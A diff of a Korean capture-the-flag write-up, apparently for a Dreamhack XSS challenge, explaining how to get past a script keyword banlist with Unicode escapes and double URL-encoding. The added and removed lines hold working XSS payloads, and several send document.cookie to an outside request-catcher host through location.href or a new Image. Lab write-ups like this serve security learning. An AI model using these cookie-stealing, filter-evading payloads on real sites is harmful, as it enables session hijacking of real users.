@@ -63,30 +63,34 @@ step 1
     ```
 * 따라서 script 태그를 이용해 banlist를 잘 우회해내면 된다. 주의할 점은 이전의 문제들과 달리 urllib.parse.quote() 부분이 없어 우회 시 인코딩 부분도 더 고려해야 한다는 점이다.
 
+step 2 페이로드 작성하기
+* 플래그를 얻으려면 /flag에 요청을 보내야 한다.
+    ```
+    /flag?answer=<script></script>
+    ```
+* Unicode Encoding Sequence 고려
+    ```
+    /flag?answer=<script>\u0061lert(document.cookie)</script>
+    ```
+    * 당연히 안된다. alert()는 headless 브라우저 내부에서 실행되기 때문. 참고로 백슬래시가 있는 \u0061은 그대로 전송된다. uanswer의 실제값은 ```<script>\u0061lert(document.cookie)</script>```
+    * 참고로 print()와 VS CODE 디버거의 출력 차이가 있다. print는 문자열을 사람이 읽을 수 있는 형태로 출력. VS code는 객체의 repr() 또는 string literal representation을 보여준다. 즉, 실제로는 백슬래시 하나지만 디버깅 과정 리터럴에서는 백슬래시 두 개로 보여준다.
 
-플래그를 얻으려면 /flag에 요청을 보내야 한다.
-/flag?answer=<script></script>
-
-/flag?answer=<script>\\u0061lert(document.cookie)</script>
-안된다.
-
+* 외부 페이지를 이용하는 페이로드 작성
+* 
+    ```
+    flag?answer=<script>\u006Cocation.\u0068ref="https://fipffyd.request.dreamhack.games?"%252Bdocument.cookie%253B;</script>
+    ```
+* 드림핵 툴즈 서비스로 주소를 하나 받아 그곳으로 get 요청을 보내게 하자. 중요한 점은 %252B이다. 이는 +를 2번 디코딩한 값으로 한 번 인코딩한 %2B를 사용하면 아무것도 발생하지 않는다. 이유는 서버 코드에 urllib.parse.quote() 부분이 없어 /flag에 하는 요청, /test에 하는 요청 두 번에 의해 디코딩 두 번이 이루어지고 url query string 부분에 붙기 때문이다. 공백 발생으로 문제가 생기므로 애초에 두번 인코딩해서 붙여 보내면 된다.
+* 주소창에 위와 같이 보내면 burp suite에서 get 요청이 아래와같이 나오면서 두 번 디코딩된 후 정상 작동한다. GET /flag?answer=%3Cscript%3E\u006Cocation.\u0068ref=%22https://fvmxped.request.dreamhack.games?%22%252Bdocument.cookie%253B;%3C/script%3E HTTP/1.1 
 
 
 ## 결과
+flag?answer=<script>\u006Cocation.\u0068ref="https://fipffyd.request.dreamhack.games?"%252Bdocument.cookie%253B;</script>
+로 해결 가능하다.
+아니면 <script>\u006Cocation.\u0068ref="https://fipffyd.request.dreamhack.games?".concat("",document.cookie);</script>와 같이 "+"가 아닌 concat을 이용할 수도 있다.
 
-http://host8.dreamhack.games:21278/flag?answer=%3Cscript%3Eal%20ert(FLAG)%3C/script%3E
-
-
-/flag?answer=<script>al\u0065rt(document.cookie)</script>
-
-&lpar;
-
+또는 image를 이용할 수도 있다. image가 필터링 대상이므로 new Image를 사용한다. 단, 소문자 처리가 되므로 방지하기 위해 I를 유니코드로 바꿔서 보낸다.
+<script>var img=new \u0049mage();img.src="https://fipffyd.request.dreamhack.games?"%252Bdocument.cookie;</script>
 
 
-/flag?answer=<script>alert&lpar;document.cookie)</script>
-
-
-<script>location.href="test?payload="+document.cookie;</script>
-
- location.href="/test?payload="+document.cookie
 
